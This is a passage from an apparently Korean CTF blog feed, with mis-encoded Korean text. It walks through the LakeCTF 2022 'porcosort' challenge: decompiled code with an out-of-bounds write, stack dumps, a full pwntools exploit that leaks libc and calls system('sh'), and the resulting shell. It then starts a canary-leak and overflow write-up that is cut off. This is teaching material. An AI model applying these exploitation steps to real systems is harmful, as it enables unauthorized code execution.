__readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> Ìï®ÏàòÏóêÏÑú <code>_IO_2_1_stdout_</code>ÏùÑ Ï∂úÎ†•Ìï¥ Ï§ÄÎã§. (gdbÎ°ú Î∞îÎ°ú Ï∞çÏñ¥Î¥§Îã§.)<br>Í∑∏Î¶¨Í≥† Ïñ¥Îñ†Ìïú ÏàòÎ•º ÏûÖÎ†•Î∞õÍ≥† Í∑∏ ÏûÖÎ†•Í∞íÏùÑ Ïù∏ÏûêÎ°ú <code>read_numbers</code> Ìï®ÏàòÏôÄ <code>get_gnomed</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïúÎã§.</p><h4 id="read-numbers-Ìï®Ïàò"><a href="#read-numbers-Ìï®Ïàò" class="headerlink" title="read_numbers Ìï®Ïàò"></a>read_numbers Ìï®Ïàò</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">read_numbers</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = cnt;</span><br><span class="line">  <span class="keyword">for</span> ( i = cnt; i &gt; <span class="number">0</span>; --i )                   <span class="comment">// Îí§ÏóêÏÑúÎ∂ÄÌÑ∞ Ï±ÑÏö∞Í∏∞</span></span><br><span class="line">                                                <span class="comment">// cnt ~ 1</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    buf[i] = <span class="string">&#x27;*&#x27;</span>;                               <span class="comment">// *Î°ú Ï±ÑÏö∞Í∏∞</span></span><br><span class="line">    result = __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;buf[i]);   <span class="comment">// * Ï∞çÏùÄ Í≥≥Ïóê Í∞í Ïì∞Í∏∞ Í∞ÄÎä•</span></span><br><span class="line">                                                <span class="comment">// (ÏúÑÏóêÏÑú Ìïú * Ï±ÑÏö∞Í∏∞Îäî Í∑∏ÎÉ• Ï¥àÍ∏∞Ìôî ÏûëÏóÖ)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Îëê Î≤àÏß∏ Ïù∏Ïûê <code>cnt</code>Îäî ÎÇòÏùò ÏûÖÎ†• Í∞íÏù¥Îã§. Í≤∞Î°†Ï†ÅÏúºÎ°ú Ïä§ÌÉùÏóê ÎÇ¥Í∞Ä ÏõêÌïòÎäî Îç∞Ïù¥ÌÑ∞Î•º ÎÑ£ÏùÑ Ïàò ÏûàÎã§.</p><p>Ïù¥Îïå oob writeÍ∞Ä Í∞ÄÎä•ÌïòÎã§. Ïù∏ÏûêÎ°ú ÎÑòÏñ¥Ïò® <code>buf</code>Îäî ÌÅ¨Í∏∞Í∞Ä 48Ïù¥Îã§. Ïù¥Îïå <code>cnt</code>Í∞Ä 48Ïù¥ÎùºÎ©¥ <code>&amp;buf[48]</code>Ïóê Ï†ëÍ∑ºÌïòÏó¨ Ïì∞Í∏∞Í∞Ä Í∞ÄÎä•ÌïòÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48] ~ &amp;buf[1]</span><br></pre></td></tr></table></figure><p>oob writeÍ∞Ä Î∞úÏÉùÌïòÏßÄ ÏïäÏúºÎ†§Î©¥(ÏõêÎûòÎåÄÎ°úÎùºÎ©¥) ÏïÑÎûòÏ≤òÎüº 0Î∂ÄÌÑ∞ <code>cnt-1</code>ÍπåÏßÄÎßå Ï†ëÍ∑ºÌï¥ÏïºÍ≤†ÏßÄ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;buf[48-1] ~ &amp;buf[0]</span><br></pre></td></tr></table></figure><p>Í∑∏Îüº Ïù¥Ï†ú Ïö∞Î¶¨Í∞Ä oobÎ•º ÌÜµÌï¥ Ï†ëÍ∑ºÌï† Ïàò ÏûàÎäî <code>&amp;buf[48]</code>Ïóê Ï†ÄÏû•Îêú Í∞íÏù¥ Î≠îÏßÄ Í∂ÅÍ∏àÌïòÎã§. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__int64 stack_buf[<span class="number">48</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 sort_cnt; <span class="comment">// [rsp+1A0h] [rbp-20h] BYREF</span></span><br><span class="line"><span class="type">unsigned</span> __int64 canary; <span class="comment">// [rsp+1A8h] [rbp-18h]</span></span><br></pre></td></tr></table></figure><p><code>buf</code> Î∞îÎ°ú Î∞ëÏóê <code>cnt</code>Í∞Ä Ï°¥Ïû¨ÌïúÎã§. Í∑∏Î†áÎã§. <code>&amp;buf[48]</code>ÏóêÎäî Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÏù∏ <code>cnt</code>Í∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎã§. Ïù¥ Îßê Ï¶âÏä®.. <code>read_numbers</code> Ìï®ÏàòÍ∞Ä ÎÅùÎÇòÍ≥† Îã§Ïùå Ìò∏Ï∂úÎê† <code>get_gnomed</code> Ìï®ÏàòÏùò Ïù∏ÏûêÎ•º Ï°∞Ïûë Í∞ÄÎä•ÌïòÎã§Îäî ÏùòÎØ∏Ïù¥Îã§.</p><h4 id="get-gnomed-Ìï®Ïàò"><a href="#get-gnomed-Ìï®Ïàò" class="headerlink" title="get_gnomed Ìï®Ïàò"></a>get_gnomed Ìï®Ïàò</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get_gnomed</span><span class="params">(_QWORD *buf, __int64 cnt)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *curr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  curr = buf;</span><br><span class="line">  <span class="keyword">while</span> ( curr &lt; &amp;buf[cnt] )                    <span class="comment">// Ï≤òÏùåÏóî stdout addr</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( curr == buf || *curr &gt;= *(curr - <span class="number">1</span>) ) <span class="comment">// ÏùåÏàòÎ°ú ÌÅ¨Í∏∞ ÎπÑÍµê</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++curr;                                   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      *(curr - <span class="number">1</span>) ^= *curr;</span><br><span class="line">      *curr ^= *(curr - <span class="number">1</span>);</span><br><span class="line">      --curr;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Í∑∏ÎÉ• ÌÅ¨Í∏∞ ÏàúÏúºÎ°ú Ï†ïÎ†¨ÌïòÎäî ÏΩîÎìúÏù¥Îã§. ÎåÄÏÜåÎπÑÍµêÏóê ÎßàÏö∞Ïä§Î•º Ïò¨Î†§Î≥¥Î©¥ <code>*curr &gt;= *(curr-1)</code> ÏóêÏÑú signedÎ°ú ÎπÑÍµêÎ•º ÌïòÍ≥† ÏûàÎäî Í≤ÉÏùÑ ÌôïÏù∏Ìï† Ïàò ÏûàÎã§. Ï∞∏Í≥†Î°ú Ïù¥ ÏÇ¨Ïã§ÏùÄ ÏùµÏä§ÌïòÎäî Îç∞Ïóê ÏûàÏñ¥ÏÑú ÏïÑÏ£º Ï§ëÏöîÌïòÎã§.. </p><p>Ïä§ÌÉùÏóê ÏõêÌïòÎäî Í∞íÎì§ÏùÑ Ï†ÅÏúºÎ©¥ Í≤∞Íµ≠ Ïó¨Í∏∞ÏóêÏÑú Îã§Ïãú Ï†ïÎ†¨ÌïòÍ≤å ÎêòÎäîÎç∞, ÌÅ¨Í∏∞ ÏàúÏúºÎ°ú Ï†ïÎ†¨Ïù¥ ÎêòÎãàÍπå Í∞íÏùÑ Ïñ¥ÎñªÍ≤å ÎÑ£ÏùÑ ÏßÄ ÏÉùÍ∞ÅÏùÑ ÏûòÌï¥Ïïº ÌïúÎã§.</p><p>Ïùå Ï∑®ÏïΩÏ†êÏùÑ ÏÑ§Î™ÖÌïòÎäî Ìï¥Îãπ Î∂ÄÎ∂ÑÏóêÏÑúÎäî ÏÇ¥Ïßù ÎßûÏßÄ ÏïäÎäî Í≤É Í∞ôÏßÄÎßå Ïù¥Ïñ¥ÏÑú ÏÑ§Î™ÖÌïòÎäî Í≤ÉÏù¥ Ïù¥Ìï¥ÌïòÍ∏∞Ïóê Ïâ¨Ïö¥ Í≤É Í∞ôÏïÑ Î∞îÎ°ú Ïä§ÌÉùÏùÑ Î≥¥Ïó¨Ï£ºÍ≤†Îã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x00007f29d7a406c00x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x00007f29d788ca400x00007f29d786a1d6</span><br><span class="line">0x7ffe3265c1c0:0x00000000000000390xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000xa3d3707cd6109c68</span><br><span class="line">0x7ffe3265c1e0:0x00007ffe3265c2400x0000562e91ec649e // Ìï¥Îãπ Ìï®ÏàòÍ∞Ä ÎÅùÎÇòÍ≥† 0x0000562e91ec649eÎ°ú Í∞ê</span><br><span class="line">0x7ffe3265c1f0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c200:0x80000000000068730x0000000000000000</span><br></pre></td></tr></table></figure><p>Ïù¥ Í∞íÎì§ÏùÑ <code>get_gnomed</code> Ìï®ÏàòÎ•º Í±∞ÏπòÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0x7ffe3265c040:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c050:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c060:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c070:0x80000000000068730x8000000000006873</span><br><span class="line">...</span><br><span class="line">0x7ffe3265c190:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1a0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1b0:0x80000000000068730x8000000000006873</span><br><span class="line">0x7ffe3265c1c0:0xa3d3707cd6109c680xa614ed753417eb00 // 0x7ffe3265c1c8: canary</span><br><span class="line">0x7ffe3265c1d0:0x00000000000000000x0000000000000039</span><br><span class="line">0x7ffe3265c1e0:0x0000562e91ec649e0x00007f29d786a1d6 // 0x7ffe3265c1e8: ret address</span><br><span class="line">0x7ffe3265c1f0:0x00007f29d788ca400x00007f29d7a406c0 // 0x7ffe3265c1f0: system address</span><br><span class="line">0x7ffe3265c200:0x00007ffe3265c2400x0000000000000000</span><br></pre></td></tr></table></figure><p>ÌòÑÏû¨ Ïπ¥ÎÇòÎ¶¨Îäî <code>0x7ffe3265c1c8</code> Ï£ºÏÜåÏóê ÏúÑÏπòÌïúÎã§.</p><p>ÏùµÏä§Î•º ÏûëÏÑ±Ìï† Îïå Í∞ÄÏû• ÍπåÎã§Î°úÏö¥ Ï†êÏùÄ Ïπ¥ÎÇòÎ¶¨Ïùò Í∞íÏù¥ ÎûúÎç§Ïù¥ÎûÄ Ï†êÏù¥Îã§. Ïù¥ ÏúÑÏπòÍ∞Ä Î∞îÎÄåÎ©¥ ÎãπÏó∞ÌïòÍ≤åÎèÑ <code>*** stack smashing detected ***: terminated</code>Ïù¥ Î∞úÏÉùÌïòÎäîÎç∞, Ïπ¥ÎÇòÎ¶¨Ïùò Í∞íÏùÄ ÎûúÎç§Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê Ï†ÅÎãπÌûà ÏûëÏùÄ Ïàò(ÏùåÏàò?)Ïù¥Í∏∏ Í∏∞ÎåÄÌï¥Ïïº ÌïúÎã§. Ïù¥ ÎïåÎ¨∏Ïóê ÏùµÏä§ ÏΩîÎìúÎäî ÌôïÎ•†Ïù¥ Ï°∞Í∏à ÏûàÎã§.</p><p>Í∑∏Î¶¨Í≥† <code>0x8000000000006873</code>Í∞Ä Î≥¥Ïù¥ÎäîÎç∞ Ïù¥Îäî <code>-9223372036854749069</code> Ïù¥Îã§. ÏÇ¨Ïã§ÏùÄ <code>sh</code>ÏùÑ ÏùòÎèÑÌïú Î¨∏ÏûêÏó¥Ïù¥Îã§. Ïôú Ïù¥Î†áÍ≤å Ï§¨ÏùÑÍπå?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">‚ñ∫ 0x56310fe0d428 &lt;vuln+294&gt;    call   get_gnomed                &lt;get_gnomed&gt;</span><br><span class="line">       rdi: 0x7ffe3265c040 ‚Äî‚ñ∏ 0x7f4d54ba36c0 (_IO_2_1_stdout_) ‚óÇ‚Äî 0xfbad2887</span><br><span class="line">       rsi: 0x39</span><br><span class="line">       rdx: 0x39</span><br><span class="line">       rcx: 0x0</span><br></pre></td></tr></table></figure><p><code>get_gnomed</code> Ìï®ÏàòÎ•º Ìò∏Ï∂úÌï† ÎñÑ rdiÏùò Í∞íÏùÄ <code>0x7ffe3265c040</code>Ïù¥Îã§. Ïù¥ Ìï®ÏàòÏóêÏÑú <code>rdi</code>Î•º Ïì∞ÏßÄ ÏïäÍ∏∞ ÎïåÎ¨∏Ïóê Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎê† ÎïåÎèÑ rdiÍ∞Ä ÎèôÏùºÌïòÎã§.</p><p>Í∑∏Î†áÎã® ÎúªÏùÄ <code>system</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Îïå ÎÇ¥Í∞Ä ÏõêÌïòÎäî Îß§Ïö∞ ÏûëÏùÄ Í∞íÏúºÎ°ú <code>rdi</code>Î°ú ÏßÄÏ†ïÌï† Ïàò ÏûàÎã® Îúª</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ÏãúÎÇòÎ¶¨Ïò§"><a href="#ÏãúÎÇòÎ¶¨Ïò§" class="headerlink" title="ÏãúÎÇòÎ¶¨Ïò§"></a>ÏãúÎÇòÎ¶¨Ïò§</h3><ol><li>OOB write Ìä∏Î¶¨Í±∞ ÏúÑÌï¥ <code>cnt</code> ÏûÖÎ†• Ïãú 48 ÏûÖÎ†•</li><li><code>_IO_2_1_stdout_</code> Ï∂úÎ†•Ìï¥Ï£ºÎäî Í≤ÉÏùÑ Ïù¥Ïö©ÌïòÏó¨ libc base Íµ¨ÌïòÍ∏∞</li><li>Ï†ïÎ†¨Ìï† Í∞íÎì§ÏùÑ Ï†ÅÏùÑ Îïå(Ïä§ÌÉùÏóê Í∞íÏùÑ Ï†ÅÏùÑ Îïå) <code>cnt</code>Î•º Îçî ÌÅ∞ ÏàòÎ°ú ÌïòÍ∏∞ ÏúÑÌï¥ Îß® Ï≤òÏùå 57 ÏûÖÎ†• &lt;- OOB write Ìä∏Î¶¨Í±∞ Îê®</li><li>Ïä§ÌÉùÏóê ÌéòÏù¥Î°úÎìú ÏûÖÎ†•: ret Í∞ÄÏ†Ø ÌïÑÏöî (<code>movaps xmmword ptr [rsp + 0x50], xmm0</code>ÏóêÏÑú Î©àÏ∂îÍ∏∞ ÎïåÎ¨∏)</li><li>Ïπ¥ÎÇòÎ¶¨Ïùò ÏúÑÏπòÍ∞Ä Ï†ú ÏúÑÏπòÏóê Ïò®Ï†ÑÌûà ÏûàÏùÑ Ïàò ÏûàÎèÑÎ°ù Í∏∞ÎèÑ</li></ol><p>Ïó¨Îã¥Ïù¥ÏßÄÎßå <code>ret</code> Ï£ºÏÜåÍ∞Ä <code>system</code> Ï£ºÏÜåÎ≥¥Îã§ ÏûëÍ≤å Íµ¨Ìï¥Ï°åÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥Í±∞Ïóê ÎåÄÌïú ÌÅ¨Í∏∞ Í≥†ÎØºÏùÄ ÌïòÏßÄ ÏïäÏïòÎã§.</p><h3 id="Í∞ÄÏ†Ø-Ï∞æÍ∏∞"><a href="#Í∞ÄÏ†Ø-Ï∞æÍ∏∞" class="headerlink" title="Í∞ÄÏ†Ø Ï∞æÍ∏∞"></a>Í∞ÄÏ†Ø Ï∞æÍ∏∞</h3><h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@22:~/ctf/lake/porcosort2$ ROPgadget --binary libc.so.6 | grep &quot; : ret&quot;</span><br><span class="line">0x00000000000291d6 : ret</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.polygl0ts.ch&#x27;, 3900)</span></span><br><span class="line">e= ELF(<span class="string">&#x27;./porcosort&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./ld-linux-x86-64.so.2&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sh += <span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>) + <span class="string">&#x27;\x80&#x27;</span></span><br><span class="line">p.send(sh * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;leak :: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;sort? &#x27;</span>, <span class="built_in">str</span>(<span class="number">48</span>)) <span class="comment"># it caused an oob write</span></span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x291d6</span> <span class="comment">#0x29cd6</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = [<span class="number">57</span>, ret, system] <span class="comment"># 57: sort count overwriting</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span> - <span class="built_in">len</span>(payload)):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(-<span class="number">9223372036854749069</span>)) <span class="comment"># input 0x8000000000006873</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[*] leak :: 0x7fb8ce4466c0</span><br><span class="line">[*] libc base :: 0x7fb8ce247000</span><br><span class="line">[57, 140431709372886, 140431709514304]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid=1000(jail) gid=1000(jail) groups=1000(jail)</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">run</span><br><span class="line">$ cat flag</span><br><span class="line">EPFL&#123;https://www.youtube.com/watch?v=2HjspVV0jK4&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LakeCTF 2022 - Attack on canary (canary)</title>
      <link href="/221003-lakectf2022-attack_on_canary/"/>
      <url>/221003-lakectf2022-attack_on_canary/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨, ÎèÑÏª§ÌååÏùº</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><p>Î¨∏Ï†ú Ï†úÎ™©Ïóê ÎÇòÏôÄÏûàÎìØÏù¥ Î∞îÏù¥ÎÑàÎ¶¨Ïóê CanaryÍ∞Ä ÏûàÍ≥† ÏùµÏä§ÌïòÎäî Îç∞Ïóê Ïù¥Í≤ÉÍ≥º Î∞ÄÏ†ëÌïòÍ≤å Í¥ÄÎ†®ÏûàÏùÑ Í≤ÉÏù¥Îã§.</p><p>Î≥ºÎßåÌïú Ìï®ÏàòÎäî Îî± ÌïòÎÇò ÏûàÎã§. <code>vulnerable()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your command: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot; %d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tell me which slot you wanna read: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf[<span class="number">8</span> * v1], <span class="number">8uLL</span>); <span class="comment">// Í∏∞Îä• 1: canary leak</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me how much you wanna write: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What are the contents (max 8 bytes): &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v1); <span class="comment">// Í∏∞Îä• 2: bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Í∏∞Îä• 1) ÏõêÌïòÎäî Ï£ºÏÜåÎ•º 8Î∞îÏù¥Ìä∏ ÏùΩÏùÑ Ïàò ÏûàÏùå -&gt; canary leak<br>Í∏∞Îä• 2) ÏõêÌïòÎäî ÏÇ¨Ïù¥Ï¶àÎßåÌÅº Ïì∞Í∏∞ Í∞ÄÎä•Ìï® -&gt; bofÎ°ú Ïù∏Ìïú rip Î≥ÄÍ≤Ω Í∞ÄÎä•</p><p>ÎßàÏπ® win Ìï®ÏàòÍ∞Ä Ï°¥Ïû¨ÌïòÎãà Ïù¥ Ï™ΩÏúºÎ°ú ÌùêÎ¶ÑÏùÑ ÎèåÎ¶¨Î©¥ Îê† ÎìØ</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>ÏõêÌïòÎäî Ï£ºÏÜåÎ•º ÏùΩÏùÑ Ïàò ÏûàÍ≥† ÏõêÌïòÎäî ÏÇ¨Ïù¥Ï¶à ÎßåÌÅº Ïì∞Îäî Í±¥ Ï†ïÎßê Í∞ïÎ†•Ìïú Í≤É 